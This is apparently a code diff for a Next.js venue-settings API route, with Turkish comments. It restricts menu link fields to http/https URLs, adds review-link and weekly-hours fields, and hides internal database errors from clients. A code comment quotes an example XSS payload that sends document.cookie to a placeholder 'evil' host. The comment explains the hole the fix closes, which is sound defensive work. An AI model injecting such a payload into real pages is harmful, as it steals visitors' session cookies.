@@ -3,10 +3,37 @@ import { z } from 'zod';
 import { createClient } from '@/lib/supabase/server';
 import { resolvePlanContext, UPGRADE_MESSAGES } from '@/lib/plans';
 import { isAllowedBackgroundImageUrl } from '@/lib/schemas/design';
+import { weeklyHoursSchema } from '@/lib/opening-hours';
 
 export const runtime = 'nodejs';
 
 const optStr = (max: number) => z.string().trim().max(max).nullish();
+
+/**
+ * Misafir menüsünde `href` olarak kullanılan DIŞ bağlantı alanları.
+ *
+ * NEDEN ayrı doğrulayıcı: bu değerler guest-menu.tsx'te doğrudan `<a href>`
+ * içine giriyor. `optStr` serbest metin olduğu için buraya
+ * `javascript:fetch('https://evil/'+document.cookie)` yazılabiliyordu ve React
+ * `javascript:` URL'lerini üretimde ENGELLEMİYOR — bağlantıya tıklayan misafir
+ * ya da menüyü inceleyen yönetici, /studyo ve /admin ile AYNI origin'de kod
+ * çalıştırırdı. Yalnız http/https kabul ediliyor.
+ */
+const httpUrl = (max: number) =>
+  z
+    .string()
+    .trim()
+    .max(max)
+    .refine((v) => {
+      if (v === '') return true;
+      try {
+        const u = new URL(v);
+        return u.protocol === 'http:' || u.protocol === 'https:';
+      } catch {
+        return false;
+      }
+    }, 'Bağlantı http:// veya https:// ile başlamalı.')
+    .nullish();
 
 /**
  * Tüm alanlar opsiyonel: PATCH kısmi güncelleme yapar. Ayarlar formu hepsini
@@ -20,9 +47,17 @@ const bodySchema = z.object({
   phone: optStr(40),
   whatsapp: optStr(40),
   instagram: optStr(120),
-  googleMapsUrl: optStr(500),
+  googleMapsUrl: httpUrl(500),
+  /** "Bizi Google'da değerlendirin" bağlantısı (müşteri talebi A4). */
+  googleReviewUrl: httpUrl(500),
   wifiSsid: optStr(120),
+  /** Eski serbest metin — yapısal saatler girilmemişse misafire bu gösterilir. */
   openingHours: optStr(200),
+  /**
+   * Yapısal haftalık çalışma saatleri (müşteri talebi A3): misafir ekranında
+   * "bugün"ün saati, ayrı bir panelde tüm hafta. Boş dizi = temizle.
+   */
+  openingHoursWeekly: weeklyHoursSchema.nullish(),
   currencyCode: z.string().length(3).optional(),
   slug: z
     .string()
@@ -84,7 +119,7 @@ export async function PATCH(request: NextRequest) {
   };
 
   // Yalnız gövdede GELEN alanlar yazılır (kısmi güncelleme).
-  const patch: Record<string, string | boolean | null> = {};
+  const patch: Record<string, unknown> = {};
   const setIf = (key: string, present: boolean, value: string | null) => {
     if (present) patch[key] = value;
   };
@@ -95,8 +130,14 @@ export async function PATCH(request: NextRequest) {
   setIf('whatsapp', b.whatsapp !== undefined, norm(b.whatsapp));
   setIf('instagram', b.instagram !== undefined, norm(b.instagram));
   setIf('google_maps_url', b.googleMapsUrl !== undefined, norm(b.googleMapsUrl));
+  setIf('google_review_url', b.googleReviewUrl !== undefined, norm(b.googleReviewUrl));
   setIf('wifi_ssid', b.wifiSsid !== undefined, norm(b.wifiSsid));
   setIf('opening_hours', b.openingHours !== undefined, norm(b.openingHours));
+  if (b.openingHoursWeekly !== undefined) {
+    // Boş dizi ya da null = "yapısal saat tanımlı değil" → serbest metne düşülür.
+    const weekly = b.openingHoursWeekly ?? [];
+    patch.opening_hours_json = weekly.length > 0 ? weekly : null;
+  }
   if (b.currencyCode) patch.currency_code = b.currencyCode;
   if (b.slug !== undefined) patch.slug = b.slug;
   if (b.logoUrl !== undefined) patch.logo_url = b.logoUrl;
@@ -170,7 +211,10 @@ export async function PATCH(request: NextRequest) {
         { status: 409 }
       );
     }
-    return NextResponse.json({ error: 'Kaydedilemedi.', details: error.message }, { status: 500 });
+    // İç hata metnini istemciye BASMIYORUZ: PostgREST mesajları kolon, kısıt ve
+    // RLS politika adlarını sızdırıyor (şema haritalama). Sunucuya loglanır.
+    console.error('[api/venue] update failed', { venueId: b.venueId, code: error.code, message: error.message });
+    return NextResponse.json({ error: 'Kaydedilemedi.' }, { status: 500 });
   }
   if (!updated) {
     return NextResponse.json({ error: 'İşletme bulunamadı veya yetkin yok.' }, { status: 403 });
